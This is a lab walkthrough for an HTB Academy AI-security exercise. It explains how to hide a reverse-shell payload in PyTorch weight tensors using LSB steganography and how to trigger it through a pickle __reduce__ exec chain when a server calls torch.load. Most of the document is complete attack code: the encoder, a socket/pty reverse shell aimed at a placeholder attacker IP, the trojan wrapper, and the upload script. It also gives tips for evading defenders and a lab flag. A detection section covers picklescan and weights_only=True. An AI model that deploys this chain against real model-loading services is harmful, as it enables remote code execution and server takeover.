---
tags: [lab, attack/ai]
module: ai_data_attacks
last_updated: 2026-05-13
---

# Execute the Attack — Model Steganography and Pickle RCE

**Platform:** HTB Academy  
**Module:** AI Data Attacks  
**Difficulty:** Hard  
**Goal:** Train a neural network, embed a reverse shell payload into its weight tensors using LSB steganography, wrap the model in a malicious pickle class, upload it to the target server, and catch the reverse shell to retrieve `flag.txt`

## Scenario

The target runs a Flask API that accepts model uploads (`POST /upload`) and loads them with `torch.load`. Because `torch.load` deserialises Python pickle streams without sandboxing, uploading a crafted `.pth` file results in arbitrary code execution on the server. Your reverse shell payload is hidden inside the model's weight tensor using least-significant-bit (LSB) steganography, extracted at deserialisation time, and executed via `exec()`.

This chains together:
- Model steganography (LSB encoding in float32 tensors)
- Pickle `__reduce__` exploitation
- Remote code execution via reverse shell

---

## Understanding the Attack Chain

### Why `torch.load` is dangerous

`torch.load` calls Python's `pickle.load` under the hood. The pickle protocol allows arbitrary Python objects to define a `__reduce__` method that specifies what code to run during deserialisation. There is no sandbox. If an attacker controls a `.pth` file that a server loads with `torch.load`, they control what code executes on the server.

### LSB steganography in float32 weights

A trained model's weight tensor consists of thousands of 32-bit floating-point numbers. Modifying only the least-significant bits of each float changes its value by a negligible amount (on the order of 10⁻⁷), leaving model behaviour intact. By encoding a payload byte-by-byte across these LSBs, you hide an arbitrary binary blob inside what looks like a normal weight file.

The encoder:
1. Prepends a 4-byte big-endian length header to the payload bytes
2. Iterates through float elements in the tensor
3. For each float, repacks the IEEE 754 bits, clears the N LSBs, and writes N bits of payload
4. The decoder reads the length header first, then extracts exactly that many payload bytes

Using `NUM_LSB = 2` stores 2 bits per float element, meaning a 320-element layer can hold 80 bytes. The `large_layer.weight` (shape `[64, 320]` = 20,480 elements) can hold ~5 KB.

### `__reduce__` pickle exploitation

When Python serialises a class instance with `pickle.dumps`, it calls `__reduce__` on the object. `__reduce__` returns a tuple `(callable, args)`, which pickle records as the recipe to reconstruct the object. During deserialisation, `pickle.loads` calls `callable(*args)`.

The `TrojanModelWrapper.__reduce__` returns `(exec, (loader_code_string,))`, which means:
- During deserialisation: `exec(loader_code_string)` runs
- `loader_code_string` contains embedded decode functions, the encrypted payload bytes, and the final `exec(decoded_reverse_shell)` chain

---

## Environment Setup (CLI)

```bash
mkdir work && cd work

# Install dependencies
wget -q https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-x86_64.sh
chmod +x Miniconda3-latest-Linux-x86_64.sh
./Miniconda3-latest-Linux-x86_64.sh -b -u
eval "$(/home/$USER/miniconda3/bin/conda shell.$(ps -p $$ -o comm=) hook)"

conda tos accept --override-channels --channel https://repo.anaconda.com/pkgs/main
conda tos accept --override-channels --channel https://repo.anaconda.com/pkgs/r

# Clean up installer to free disk space (limited on HTB workstation)
rm Miniconda3-latest-Linux-x86_64.sh

pip install numpy torch torchvision torchaudio \
    --extra-index-url https://download.pytorch.org/whl/cpu
```

Create a new script file:

```bash
nano exploit.py
```

---

## Phase 1 — Define and Train SimpleNet

### Do you actually need to train anything?

**No.** Training is irrelevant to the attack. The server never runs inference — it calls
`torch.load`, which immediately fires `__reduce__` → `exec`. The weights are just a float32
container for the LSB payload. You have three options:

| Option | What you do | Notes |
|--------|-------------|-------|
| **Untrained random weights** | Instantiate `SimpleNet`, call `torch.save(model.state_dict(), ...)` immediately — no training loop | Fastest; weights are random but the attack doesn't care |
| **Train on dummy data** (lab default) | Run 5 epochs of meaningless regression | Cosmetically makes weights look "trained"; adds no security value |
| **Use a pre-existing model** | Download any `.pth` from torch.hub / torchvision, load with `weights_only=True`, pick the largest float32 tensor | Most realistic scenario; see "Using a Pre-built Model" below |

The lab uses the dummy-training path because it is self-contained. In a real engagement, using
a legitimate pre-existing model is strictly more convincing because the file matches what
defenders expect to see in a model registry.

### Lab default: build and train SimpleNet

```python
import torch
import torch.nn as nn
import torch.optim as optim
from torch.utils.data import TensorDataset, DataLoader
import numpy as np, os, struct, pickle, requests

SEED = 1337
np.random.seed(SEED)
torch.manual_seed(SEED)


class SimpleNet(nn.Module):
    def __init__(self, input_size, hidden_size, output_size):
        super().__init__()
        self.fc1 = nn.Linear(input_size, hidden_size)
        self.relu = nn.ReLU()
        self.fc2 = nn.Linear(hidden_size, output_size)
        # large_layer is not in the forward pass — it exists solely to provide
        # steganographic capacity in its weight tensor.
        self.large_layer = nn.Linear(hidden_size, hidden_size * 5)

    def forward(self, x):
        return self.fc2(self.relu(self.fc1(x)))


input_dim, hidden_dim, output_dim = 10, 64, 1
model = SimpleNet(input_dim, hidden_dim, output_dim)
```

**Why `large_layer`?** Shape `[320, 64]` = 20,480 float32 elements. At `NUM_LSB = 2`:
`20480 × 2 / 8 = 5120` bytes capacity — enough for a multi-line Python reverse shell. The
layer is intentionally excluded from `forward()` so its weights never change after
initialisation, keeping the embedding stable across any further fine-tuning.

```python
# Dummy training — skip entirely if using untrained weights
X = torch.randn(100, input_dim)
y = X @ torch.randn(input_dim, output_dim) + torch.randn(100, output_dim) * 0.5
loader = DataLoader(TensorDataset(X, y), batch_size=16)

criterion = nn.MSELoss()
optimizer = optim.Adam(model.parameters(), lr=0.01)
model.train()
for epoch in range(5):
    for inputs, targets in loader:
        optimizer.zero_grad()
        loss = criterion(model(inputs), targets)
        loss.backward()
        optimizer.step()

torch.save(model.state_dict(), "victim_model_state.pth")
print("Model saved.")
```

### Alternate: using a pre-existing model

Any `.pth` file with a sufficiently large float32 tensor works. Torchvision ships several:

```python
import torchvision.models as models
import torch

# Load a small pre-trained model (safe: weights_only=True prevents __reduce__ attacks)
model = models.mobilenet_v2(weights=models.MobileNet_V2_Weights.DEFAULT)
state_dict = model.state_dict()

# Inspect tensors to find one large enough for the payload
for key, tensor in state_dict.items():
    if tensor.dtype == torch.float32:
        capacity_bytes = (tensor.numel() * 2) // 8  # assuming NUM_LSB=2
        if capacity_bytes > 5000:
            print(f"{key}: {tensor.shape}  →  {capacity_bytes} bytes capacity")
```

Pick any tensor from that list as your `target_key`. The rest of the exploit is identical —
you are not modifying the model class definition, only the bytes in the weight file.

---

### Detection training exercise

Poisoning your own local model and then trying to detect the changes is a **high-value exercise**.
The attack is designed to be invisible to casual inspection, so you have to apply deliberate
forensic techniques to find it. Here is a structured exercise using two runs of Phase 1:

**Step 1 — Create a clean baseline**

```python
torch.save(model.state_dict(), "clean_model.pth")
```

**Step 2 — Poison it (with a benign payload, not a live reverse shell)**

```python
dummy_payload = b"DETECTION_TEST_PAYLOAD_" * 20   # 460 bytes, clearly recognisable
modified_tensor = encode_lsb(state_dict["large_layer.weight"], dummy_payload, num_lsb=2)
poisoned_dict = dict(state_dict)
poisoned_dict["large_layer.weight"] = modified_tensor
torch.save(poisoned_dict, "poisoned_model.pth")
```

**Step 3 — Try to detect the poisoning using the methods below**

```python
clean    = torch.load("clean_model.pth",    weights_only=True)
poisoned = torch.load("poisoned_model.pth", weights_only=True)

# Method 1: Weight delta — the diff should be tiny but non-zero only in the target layer
for key in clean:
    delta = (clean[key].float() - poisoned[key].float()).abs()
    if delta.max() > 0:
        print(f"{key}: max_delta={delta.max():.2e}  mean_delta={delta.mean():.2e}")
```

A successful poisoning shows `max_delta ≈ 10⁻⁷` in `large_layer.weight` and exactly zero in
all other layers. This is the forensic signature: any model where one specific tensor has
systematic tiny perturbations while others are clean should be treated as suspect.

```python
# Method 2: LSB chi-squared uniformity test
# In an unpoisoned float32 tensor the LSBs are effectively random (mantissa noise).
# After LSB encoding, the bits are determined by the payload — still random-looking
# but drawn from a different distribution (the payload's byte statistics).
# A chi-squared test on bit frequencies can sometimes distinguish them.
import numpy as np, struct

def extract_lsb_bits(tensor, num_lsb=2):
    bits = []
    for f in tensor.flatten().tolist():
        iv = struct.unpack(">I", struct.pack(">f", f))[0]
        for i in range(num_lsb - 1, -1, -1):
            bits.append((iv >> i) & 1)
    return np.array(bits)

clean_bits    = extract_lsb_bits(clean["large_layer.weight"])
poisoned_bits = extract_lsb_bits(poisoned["large_layer.weight"])

print(f"Clean    LSB bit frequency: {clean_bits.mean():.4f}  (expect ~0.5)")
print(f"Poisoned LSB bit frequency: {poisoned_bits.mean():.4f}  (expect ~0.5 but different variance)")
```

```python
# Method 3: picklescan (detects __reduce__ RCE before you even load the file)
# pip install picklescan
# picklescan malicious_trojan_model.pth
# Output: INFECTED — found dangerous global: builtins exec
```

**picklescan** is the most important real-world detection tool. It parses the pickle opcodes
without executing them and flags any `GLOBAL` instruction that resolves to a dangerous callable
(`exec`, `eval`, `os.system`, `subprocess.*`). It catches the `TrojanModelWrapper.__reduce__`
pattern immediately, before the file is ever loaded.

```bash
pip install picklescan
picklescan clean_model.pth      # Expected: No dangerous globals found.
picklescan poisoned_model.pth   # Expected: INFECTED
```

**Step 4 — Try `weights_only=True` as the simplest defence**

```python
# This is the correct defence — raises an exception on any custom class or exec call
try:
    torch.load("malicious_trojan_model.pth", weights_only=True)
    print("Clean")
except Exception as e:
    print(f"BLOCKED: {e}")
```

Any model that cannot be loaded with `weights_only=True` is immediately suspect. In production,
never call `torch.load` without this flag on a file you did not generate yourself.

**What the exercise teaches:**
- The weight-delta method only works if you have the clean baseline — realistic when auditing a model that has been through a CI/CD pipeline with saved artifacts
- LSB statistical tests are noisy and unreliable for small payloads; picklescan is categorically more reliable
- The real defence is process: validate all model files with `weights_only=True` at the load site, and gate model registry writes behind code review the same way you gate code changes

---

## Phase 2 — LSB Encoding / Decoding Functions

```python
def encode_lsb(tensor_orig: torch.Tensor, data_bytes: bytes, num_lsb: int) -> torch.Tensor:
    """
    Hides data_bytes in the LSBs of a float32 tensor.
    Prepends a 4-byte big-endian length header so the decoder knows when to stop.
    """
    if tensor_orig.dtype != torch.float32:
        raise TypeError("Tensor must be float32")
    tensor = tensor_orig.clone().detach()
    tensor_flat = tensor.flatten()
    n_elements = tensor.numel()

    # Prepend 4-byte length header so decoder knows payload size
    data_to_embed = struct.pack(">I", len(data_bytes)) + data_bytes
    total_bits = len(data_to_embed) * 8

    if total_bits > n_elements * num_lsb:
        raise ValueError(f"Payload too large: needs {total_bits} bits, tensor has {n_elements * num_lsb}")

    data_iter = iter(data_to_embed)
    current_byte = next(data_iter, None)
    bit_index = 7  # Start at MSB of current byte
    elem_idx = 0
    bits_written = 0

    while bits_written < total_bits and elem_idx < n_elements:
        orig_float = tensor_flat[elem_idx].item()
        # Repack IEEE 754 float as raw integer for bit manipulation
        int_rep = struct.unpack(">I", struct.pack(">f", orig_float))[0]
        mask = (1 << num_lsb) - 1   # Bitmask for the N LSBs, e.g. 0b11 for num_lsb=2

        payload_bits = 0
        for i in range(num_lsb):
            if current_byte is None:
                break
            bit = (current_byte >> bit_index) & 1     # Extract one bit from current byte
            payload_bits |= bit << (num_lsb - 1 - i)  # Pack it into the payload word
            bit_index -= 1
            if bit_index < 0:
                current_byte = next(data_iter, None)
                bit_index = 7
            bits_written += 1
            if bits_written >= total_bits:
                break

        # Clear the N LSBs of the float's integer representation, then write payload bits
        new_int = (int_rep & ~mask) | payload_bits
        tensor_flat[elem_idx] = struct.unpack(">f", struct.pack(">I", new_int))[0]
        elem_idx += 1

    return tensor
```

**How IEEE 754 bit manipulation works here:**  
A float32 is 32 bits: 1 sign bit, 8 exponent bits, 23 mantissa bits. Clearing the 2 LSBs of
the mantissa changes the value by at most `2^{-23} × 2 ≈ 2.4 × 10^{-7}` — below the precision
of most ML metrics. `struct.pack(">f", ...)` converts a Python float to its 4-byte IEEE 754
big-endian representation; `struct.unpack(">I", ...)` reinterprets those bytes as an unsigned
32-bit integer, enabling normal bitwise operations.

---

## Phase 3 — Define the Reverse Shell Payload

```python
HOST_IP       = "PWNIP"   # Your attacker IP (tun0 for HTB VPN)
LISTENER_PORT = PWNPO     # Port for your netcat listener

payload_code = f"""
import socket, subprocess, os, pty, sys, traceback
s = None
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5.0)
    s.connect(('{HOST_IP}', {LISTENER_PORT}))
    s.settimeout(None)
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    pty.spawn(os.environ.get('SHELL', '/bin/bash'))
except Exception as e:
    traceback.print_exc(file=sys.stderr)
finally:
    if s:
        s.close()
    os._exit(1)
"""

payload_bytes = payload_code.encode("utf-8")
print(f"Payload size: {len(payload_bytes)} bytes")
```

**Why `pty.spawn`?** A raw `subprocess.Popen` reverse shell provides only a dumb pipe. `pty.spawn`
allocates a pseudo-terminal, giving you a fully interactive shell (tab-completion, cursor
movement, `sudo` prompts) over the socket. `os.dup2` redirects stdin/stdout/stderr to the
socket before `pty.spawn` so all I/O flows through the connection.

---

## Phase 4 — Embed Payload into Model Weights

```python
NUM_LSB = 2
target_key = "large_layer.weight"

state_dict = torch.load("victim_model_state.pth")
original_tensor = state_dict[target_key]

print(f"Embedding {len(payload_bytes)} bytes into '{target_key}' "
      f"({original_tensor.numel()} elements, {NUM_LSB} LSBs)...")

modified_tensor = encode_lsb(original_tensor, payload_bytes, NUM_LSB)
modified_state_dict = dict(state_dict)           # Shallow copy
modified_state_dict[target_key] = modified_tensor
print("Embedding complete.")
```

---

## Phase 5 — Build the Malicious Wrapper with `__reduce__`

```python
class TrojanModelWrapper:
    """
    When pickled and loaded by torch.load on the target server,
    __reduce__ causes exec() to run loader_code, which extracts
    the reverse shell from the tensor LSBs and executes it.
    """

    def __init__(self, modified_state_dict, target_key, num_lsb):
        # Pickle the entire modified state dict as bytes so we can embed it
        # as a string literal inside the loader code string.
        self.pickled_state_dict_bytes = pickle.dumps(modified_state_dict)
        self.target_key = target_key
        self.num_lsb    = num_lsb

    def __reduce__(self):
        # __reduce__ is called by pickle when SERIALISING this object.
        # It returns (callable, args); when DESERIALISED, Python calls callable(*args).
        # We return (exec, (code_string,)) so the server executes our loader code
        # as soon as torch.load deserialises this object.

        # Embed all necessary data as string literals inside the code string.
        # The code string is self-contained — it carries its own decode function,
        # the raw bytes of the state dict, and the execution logic.
        pickled_literal = repr(self.pickled_state_dict_bytes)
        loader_code = f"""
import pickle, torch, struct, os, pty, socket, sys, traceback

# Inline decode_lsb (same algorithm as encode_lsb in reverse)
def decode_lsb(tensor, num_lsb):
    flat = tensor.float().flatten()
    n = flat.numel()
    idx = 0
    def get_bits(count):
        nonlocal idx
        bits = []
        while len(bits) < count:
            f = flat[idx].item()
            iv = struct.unpack('>I', struct.pack('>f', f))[0]
            mask = (1 << num_lsb) - 1
            lsb = iv & mask
            for i in range(num_lsb):
                bits.append((lsb >> (num_lsb - 1 - i)) & 1)
                if len(bits) == count: break
            idx += 1
        return bits
    length_bits = get_bits(32)
    length = 0
    for b in length_bits: length = (length << 1) | b
    payload_bits = get_bits(length * 8)
    out = bytearray()
    cur, cnt = 0, 0
    for b in payload_bits:
        cur = (cur << 1) | b; cnt += 1
        if cnt == 8: out.append(cur); cur = 0; cnt = 0
    return bytes(out)

sd = pickle.loads({pickled_literal})
payload_bytes = decode_lsb(sd['{self.target_key}'], {self.num_lsb})
exec(payload_bytes.decode('utf-8'), globals(), locals())
"""
        return (exec, (loader_code,))
```

**The `__reduce__` exploitation pattern explained:**

`pickle` stores objects as a sequence of opcodes. When it encounters a custom class instance
it calls `__reduce__()` and records the returned `(callable, args)` tuple. On the server side,
`pickle.load` / `torch.load` reconstructs the object by calling `callable(*args)`. Since there
is no allowlist, `exec` is a valid callable. The `loader_code` string carries:

1. The inline `decode_lsb` function (self-contained; doesn't depend on imports at the call site)
2. The pickled state dict bytes as a Python `bytes` literal embedded with `repr()`
3. The extraction + `exec` chain that runs the reverse shell

---

## Phase 6 — Save and Upload the Malicious `.pth` File

```python
# Create and save the wrapper — this triggers __reduce__ during torch.save
wrapper = TrojanModelWrapper(modified_state_dict, target_key, NUM_LSB)
torch.save(wrapper, "malicious_trojan_model.pth")
print(f"Malicious file size: {os.path.getsize('malicious_trojan_model.pth')} bytes")
```

**Why does `torch.save` trigger `__reduce__`?**  
`torch.save` calls `pickle.dump` internally. Pickling `wrapper` invokes `wrapper.__reduce__()`,
which returns `(exec, (loader_code,))`. The pickle stream records this tuple. When the server
calls `torch.load`, it unpickles and executes `exec(loader_code)`.

---

## Phase 7 — Start Listener and Upload

In a **second terminal**, start the netcat listener before uploading:

```bash
nc -nvlp PWNPO
```

Then upload:

```python
api_url = "http://STMIP:5555/upload"

with open("malicious_trojan_model.pth", "rb") as f:
    response = requests.post(
        api_url,
        files={"model": ("malicious_trojan_model.pth", f, "application/octet-stream")},
        timeout=30,
    )
print(response.status_code)
print(response.text)
```

If the upload succeeds (HTTP 200), check the netcat terminal for the incoming connection.

---

## Phase 8 — Retrieve the Flag

```bash
# In the netcat listener terminal after connection arrives:
cat flag.txt
```

Flag: `HTB{D0ck3r1z3d_P1ckl3_Sh3ll_!n_Th3_M0d3l}`

---

## Troubleshooting

| Issue | Cause | Fix |
|-------|-------|-----|
| No connection received | Listener started after upload, or wrong IP/port | Always start `nc` before running the upload cell |
| `Connection refused` on upload | Instance not running or wrong port (API is 5555 not 5000) | Check the lab instance URL |
| `Tensor too small for payload` | Payload exceeds `large_layer.weight` capacity | Reduce payload or increase `hidden_dim * 5` |
| Shell spawns and immediately exits | `os._exit(1)` in `finally` block fires before `pty.spawn` | Remove `os._exit(1)` or move it inside the `except` branch only |
| Server returns 500 | Unpickling error in loader code (syntax) | Test the loader code locally: `exec(loader_code)` in a Python shell |

---

## Key Concepts

- **`__reduce__` is the pickle RCE vector** — any class implementing `__reduce__` can execute arbitrary code on deserialisation. `torch.load` without `weights_only=True` is equivalent to executing untrusted pickle.
- **LSB steganography preserves model behaviour** — float32 LSBs contribute < 10⁻⁷ to each parameter value; this is below the effective precision of most training procedures and invisible to loss curves or accuracy benchmarks.
- **`repr(bytes_object)` embeds binary data as a string literal** — `repr(b'\x00\xff...')` produces a Python `bytes` literal that is syntactically valid inside an f-string and self-evaluating, allowing binary data to be transported inside a code string.
- **`weights_only=True` as the defence** — `torch.load(path, weights_only=True)` uses a restricted unpickler that only allows tensor data. It raises an exception on any custom class or exec call. This is the correct defence and is the default in newer PyTorch versions.

---

## Related Pages

- [[attack/ai/model_steganography]] — theory: pickle `__reduce__` pattern, LSB encoding, full reverse shell chain
- [[attack/ai/vulnerable_ai_systems]] — system-layer attacks including ShellTorch and MLflow LFI
- [[labs/htb/ai_data_attacks/evaluating_trojan_attack]] — previous lab: data-layer backdoor via training poisoning
- [[attack/ai/attacking_ai_systems]] — hub: all AI system attack categories

## Sources

- raw/lab/ai_data_attacks/execute_the_attack.md
